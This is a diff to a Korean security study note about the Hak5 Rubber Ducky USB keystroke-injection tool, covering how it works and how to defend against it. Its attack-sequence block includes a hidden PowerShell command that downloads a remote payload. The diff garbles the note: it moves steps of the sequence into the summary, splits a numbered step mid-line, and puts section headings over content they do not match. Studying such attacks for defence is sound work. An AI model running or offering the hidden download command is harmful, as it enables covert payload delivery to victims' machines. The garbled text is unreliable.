@@ -5,15 +5,19 @@ date = "2026-04-22"
 [extra]
 categories = "studynote-security"
 +++
+## 0. 핵심 인사이트
 
-## 핵심 인사이트 (3줄 요약)
+> 2. OS Recognizes "Generic HID Keyboard"
+
+> 📝 모범 답안
+
 1. **본질**: 일반적인 USB 메모리 외형을 가졌으나 내부적으로는 프로그래밍 가능한 키보드로 동작하여, 미리 설정된 악성 스크립트를 초고속으로 자동 입력하는 침투 테스트용 도구다.
 2. **가치**: 10년 넘게 'BadUSB' 공격의 대명사로 군림하며, 보안 솔루션이 파일을 검사할 때 '입력'으로 공격하는 비대칭적 침투 경로를 전 세계에 증명했다.
 3. **판단 포인트**: 기술적 세련미보다는 사회 공학적 허점과 입력 장치에 대한 무조건적 신뢰를 파고들기 때문에, 사용자 교육과 함께 인터랙티브 로그인 보안 강화가 주효한 대응책이다.
 
 ---
 
-## Ⅰ. 개요 및 필요성
+## 1. 개요 및 필요성
 
 Rubber Ducky(러버 덕키)는 보안 연구소인 Hak5에서 개발한 대표적인 HID(Human Interface Device) 공격 도구다. 겉모습은 평범한 USB 드라이브와 똑같아 누구도 경계하지 않지만, 컴퓨터에 꽂는 순간 초당 1,000단어 이상의 속도로 명령어를 타이핑하는 '고스트 키보드'로 변신한다.
 
@@ -23,7 +27,7 @@ Rubber Ducky(러버 덕키)는 보안 연구소인 Hak5에서 개발한 대표�
 
 ---
 
-## Ⅱ. 아키텍처 및 핵심 원리
+## 2. 구성요소
 
 Rubber Ducky는 단순한 구조 속에 강력한 기능을 담고 있다.
 
@@ -36,8 +40,7 @@ Rubber Ducky는 단순한 구조 속에 강력한 기능을 담고 있다.
 
 ```text
 [ Rubber Ducky Attack Sequence ]
-1. Plugin -> 2. OS Recognizes "Generic HID Keyboard"
-3. Rubber Ducky Reads 'inject.bin' from MicroSD
+1. Plugin -3. Rubber Ducky Reads 'inject.bin' from MicroSD
 4. Rubber Ducky Emulates Keypresses:
    - [GUI + R] (Run Dialog)
    - [STRING] "powershell -w hidden -c (New-Object Net.WebClient).DownloadFile(...)"
@@ -51,7 +54,7 @@ Rubber Ducky는 단순한 구조 속에 강력한 기능을 담고 있다.
 
 ---
 
-## Ⅲ. 비교 및 연결
+## 3. 구조 및 동작 원리
 
 Rubber Ducky는 하드웨어 침투 도구 생태계에서 기준점 역할을 한다.
 
@@ -68,7 +71,7 @@ Rubber Ducky의 공격은 **Social Engineering**과 결합될 때 가장 치명�
 
 ---
 
-## Ⅳ. 실무 적용 및 기술사 판단
+## 4. 비교 및 트레이드오프
 
 실무 현장에서 Rubber Ducky 공격을 직접 경험하면 보안 의식이 획기적으로 개선된다.
 
@@ -85,7 +88,7 @@ Rubber Ducky의 공격은 **Social Engineering**과 결합될 때 가장 치명�
 
 ---
 
-## Ⅴ. 기대효과 및 결론
+## 5. 실무 적용 및 최적화 기법
 
 Rubber Ducky에 대한 방어력을 갖추는 것은 현대 보안 아키텍처의 필수 관문이다. 이를 통해 '편의성'과 '보안' 사이의 타협점이 어디에 있는지를 명확히 할 수 있으며, 직원의 보안 인식을 실질적으로 높일 수 있다.
 
